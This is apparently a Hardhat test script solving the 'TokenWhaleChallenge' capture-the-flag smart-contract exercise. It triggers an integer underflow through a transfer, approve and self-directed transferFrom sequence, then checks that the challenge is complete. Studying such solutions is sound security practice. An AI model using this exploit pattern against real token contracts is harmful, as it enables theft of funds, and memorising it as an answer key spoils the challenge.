import { assert, expect } from "chai";
import { ethers } from "hardhat";
import { utils } from "mocha";

const sleep = (timeToSleepInSecs: number) => new Promise((resolve) => {
  setTimeout(resolve, timeToSleepInSecs * 1000);
})

describe("Executing", function () {
  it("Solo hay que llamar al exploit", async function () {
    const hre = require("hardhat");
    const accounts = await hre.ethers.getSigners();
    // Attach to contracts
    const toa2="0x4356cc02940E434816c1985f95bbC44E48fd8FB4";
    const challengeContract = await (await ethers.getContractFactory("TokenWhaleChallenge")).attach(toa2);
    //Hay que generar un integer overflow:
    
    //Account A calls transfer(B, 510);
    console.log("1");
    await challengeContract.connect(accounts[0]).transfer(accounts[1].address ,510); 
    await sleep(40);
    //Account B calls approve(A, 1000);
    console.log("2");
    await challengeContract.connect(accounts[1]).approve(accounts[0].address,1010);
    await sleep(40);
    //Account A calls transferFrom(B, B, 500);
    console.log("3");
    await challengeContract.connect(accounts[0]).transferFrom(accounts[1].address,accounts[1].address,500);
    await sleep(40);
    //Validar
    console.log("4");
    expect(await challengeContract.isComplete()).to.be.true;
  });
});